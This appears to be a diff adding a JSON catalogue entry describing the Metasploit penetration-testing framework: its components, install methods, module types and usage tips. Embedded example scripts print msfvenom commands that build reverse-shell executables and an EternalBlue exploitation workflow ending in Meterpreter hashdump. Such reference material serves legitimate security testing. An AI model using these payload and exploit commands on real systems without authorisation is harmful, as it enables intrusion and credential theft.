@@ -1,0 +1,182 @@
+{
+  "api": {
+    "api_types": [
+      "JSON-RPC API",
+      "REST API (via msfrpcd)",
+      "Ruby API",
+      "Python bindings"
+    ],
+    "base_url": "msfrpcd",
+    "components": [
+      "msfconsole - Interactive console",
+      "msfvenom - Payload generator",
+      "msfdb - Database interface",
+      "msfrpcd - RPC daemon",
+      "msfupdate - Update utility"
+    ],
+    "installation_methods": [
+      {
+        "command": "Pre-installed in Kali",
+        "description": "Already included",
+        "method": "Kali Linux"
+      },
+      {
+        "command": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
+        "description": "Official installer",
+        "method": "Ubuntu/Debian"
+      },
+      {
+        "command": "brew install metasploit",
+        "description": "Homebrew installation",
+        "method": "macOS"
+      },
+      {
+        "command": "docker pull metasploitframework/metasploit-framework",
+        "description": "Container deployment",
+        "method": "Docker"
+      },
+      {
+        "command": "git clone https://github.com/rapid7/metasploit-framework.git",
+        "description": "Build from source",
+        "method": "Source"
+      }
+    ],
+    "module_types": [
+      "Exploits (3000+)",
+      "Auxiliary (1100+)",
+      "Post-exploitation (400+)",
+      "Payloads (600+)",
+      "Encoders (50+)",
+      "Nops (10+)",
+      "Evasion (15+)"
+    ],
+    "type": "rpc"
+  },
+  "authentication": {
+    "notes": "COMPLETELY FREE! Open source framework. Download and run locally. No registration or license required for Framework edition.",
+    "required": false,
+    "type": "none"
+  },
+  "authority": 98,
+  "category": "penetration-testing",
+  "coverage": 97,
+  "data_coverage": {
+    "content_types": [
+      "Exploit modules",
+      "Payload generators",
+      "Auxiliary scanners",
+      "Post-exploitation tools",
+      "Credential gathering",
+      "Privilege escalation",
+      "Persistence mechanisms",
+      "Evasion techniques"
+    ],
+    "exploit_categories": [
+      "Remote Code Execution",
+      "Local Privilege Escalation",
+      "Web Application Exploits",
+      "Service Exploits",
+      "Client-Side Exploits",
+      "FileFormat Exploits",
+      "Browser Exploits",
+      "Zero-Day Exploits"
+    ],
+    "payload_types": [
+      "Reverse shells",
+      "Bind shells",
+      "Meterpreter",
+      "Command execution",
+      "VNC injection",
+      "Staged payloads",
+      "Stageless payloads",
+      "Platform-specific payloads"
+    ],
+    "supported_platforms": [
+      "Windows",
+      "Linux",
+      "macOS",
+      "Android",
+      "iOS",
+      "Unix",
+      "PHP",
+      "Java",
+      "Python",
+      "Ruby",
+      "JavaScript/NodeJS"
+    ],
+    "temporal": {
+      "historical_data": "2003-present",
+      "latency": "Real-time exploitation",
+      "update_frequency": "Daily module updates"
+    }
+  },
+  "description": "Metasploit Framework - FREE, open source penetration testing framework. The world's most used penetration testing framework for finding, exploiting, and validating vulnerabilities.",
+  "format": "ruby",
+  "id": "metasploit-framework",
+  "integration_examples": {
+    "bash": {
+      "msf_quick_start": "#!/bin/bash\n# Metasploit Quick Start - FREE!\n\necho \"[*] Metasploit Framework (COMPLETELY FREE!)\"\necho \"=========================================\"\necho \"\"\n\necho \"[+] Installation:\"\necho \"   # Kali (Pre-installed)\"\necho \"   msfconsole\"\necho \"\"\necho \"   # Ubuntu/Debian\"\necho \"   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall\"\necho \"   chmod 755 msfinstall && ./msfinstall\"\necho \"\"\necho \"   # macOS\"\necho \"   brew install metasploit\"\necho \"\"\n\necho \"[+] Basic Commands:\"\necho \"   # Start console\"\necho \"   msfconsole\"\necho \"\"\necho \"   # Update framework\"\necho \"   msfupdate\"\necho \"\"\necho \"   # Search exploits\"\necho \"   search type:exploit platform:windows\"\necho \"\"\necho \"   # Use exploit\"\necho \"   use exploit/windows/smb/ms17_010_eternalblue\"\necho \"\"\n\necho \"[+] Generate Payloads:\"\necho \"   # Windows reverse shell\"\necho \"   msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe\"\necho \"\"\necho \"   # Linux reverse shell\"\necho \"   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf\"\necho \"\"\n\necho \"[+] Module Stats:\"\necho \"   - 3000+ Exploits\"\necho \"   - 1100+ Auxiliary\"\necho \"   - 600+ Payloads\"\necho \"   - 400+ Post modules\"\necho \"\"\n\necho \"[+] Resources:\"\necho \"   - Website: https://www.metasploit.com/\"\necho \"   - Docs: https://docs.metasploit.com/\"\necho \"   - GitHub: https://github.com/rapid7/metasploit-framework\"\necho \"\"\n\necho \"[!] 100% FREE - No license required!\""
+    },
+    "curl": {
+      "install_msf": "# Install Metasploit on Linux - FREE!\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall"
+    },
+    "python": {
+      "msf_automation": "#!/usr/bin/env python3\nimport msgpack\nimport http.client\nimport ssl\nimport base64\nimport time\nfrom typing import Dict, List\n\nclass MetasploitClient:\n    \"\"\"Metasploit Framework Client - COMPLETELY FREE!\"\"\"\n    \n    def __init__(self, password='msf', port=55553):\n        self.host = '127.0.0.1'\n        self.port = port\n        self.password = password\n        self.token = None\n        self.console_id = None\n        \n    def framework_overview(self):\n        \"\"\"Metasploit Framework overview (FREE!)\"\"\"\n        print(\"== Metasploit Framework Overview (COMPLETELY FREE!)\\n\")\n        \n        print(\"[+] Framework Statistics:\\n\")\n        stats = {\n            'Exploits': '3000+',\n            'Auxiliary': '1100+',\n            'Post': '400+',\n            'Payloads': '600+',\n            'Encoders': '50+',\n            'Nops': '10+'\n        }\n        \n        for module_type, count in stats.items():\n            print(f\"    - {module_type}: {count}\")\n        \n        print(\"\\n[+] Popular Modules:\\n\")\n        modules = [\n            'exploit/windows/smb/ms17_010_eternalblue',\n            'exploit/windows/smb/ms08_067_netapi',\n            'exploit/multi/handler',\n            'auxiliary/scanner/smb/smb_version',\n            'auxiliary/scanner/portscan/tcp',\n            'post/windows/gather/hashdump',\n            'exploit/multi/http/apache_struts2_rest_xstream'\n        ]\n        \n        for module in modules:\n            print(f\"    - {module}\")\n        \n        return stats\n    \n    def basic_workflow(self):\n        \"\"\"Basic Metasploit workflow (FREE!)\"\"\"\n        print(\"== Basic Metasploit Workflow (FREE!)\\n\")\n        \n        print(\"1. Start Metasploit:\\n\")\n        print(\"   $ msfconsole\\n\")\n        \n        print(\"2. Search for exploits:\\n\")\n        print(\"   msf6 > search type:exploit platform:windows smb\\n\")\n        \n        print(\"3. Select an exploit:\\n\")\n        print(\"   msf6 > use exploit/windows/smb/ms17_010_eternalblue\\n\")\n        \n        print(\"4. Configure options:\\n\")\n        print(\"   msf6 exploit(ms17_010_eternalblue) > show options\")\n        print(\"   msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100\")\n        print(\"   msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10\\n\")\n        \n        print(\"5. Select payload:\\n\")\n        print(\"   msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp\\n\")\n        \n        print(\"6. Run exploit:\\n\")\n        print(\"   msf6 exploit(ms17_010_eternalblue) > exploit\\n\")\n        \n        print(\"7. Post-exploitation:\\n\")\n        print(\"   meterpreter > sysinfo\")\n        print(\"   meterpreter > hashdump\")\n        print(\"   meterpreter > screenshot\\n\")"
+    }
+  },
+  "last_updated": "2025-08-16T00:00:00.000Z",
+  "metadata": {
+    "alternatives": [
+      "cobalt-strike",
+      "empire",
+      "covenant"
+    ],
+    "last_verified": "2025-08-16",
+    "license": "BSD-3-Clause",
+    "maintainer": "Rapid7",
+    "related_resources": [
+      "Exploit Database",
+      "VulnHub",
+      "Offensive Security",
+      "Rapid7 Blog"
+    ]
+  },
+  "name": "Metasploit Framework",
+  "operational_guidance": {
+    "best_practices": [
+      "Always get authorization",
+      "Use in isolated environments",
+      "Start with auxiliary modules",
+      "Verify exploits in lab first",
+      "Use appropriate payloads",
+      "Document all activities",
+      "Follow responsible disclosure",
+      "Keep framework updated"
+    ],
+    "common_use_cases": [
+      "Penetration testing",
+      "Vulnerability validation",
+      "Security research",
+      "Red team operations",
+      "Security assessments",
+      "Exploit development",
+      "Post-exploitation",
+      "Privilege escalation testing",
+      "Network pivoting",
+      "Security training"
+    ],
+    "recommended_update_frequency": "Update before each engagement",
+    "value_proposition": "The world's most used penetration testing framework, completely free and open source with thousands of modules"
+  },
+  "quality_metrics": {
+    "accessibility": "Completely free",
+    "completeness": "Most comprehensive exploit database",
+    "cost": "COMPLETELY FREE",
+    "data_quality": "Community and Rapid7 verified",
+    "reliability": "excellent",
+    "update_speed": "Daily"
+  },
+  "quality_score": 97,
+  "subcategory": "metasploit",
+  "url": "https://www.metasploit.com/"
+}
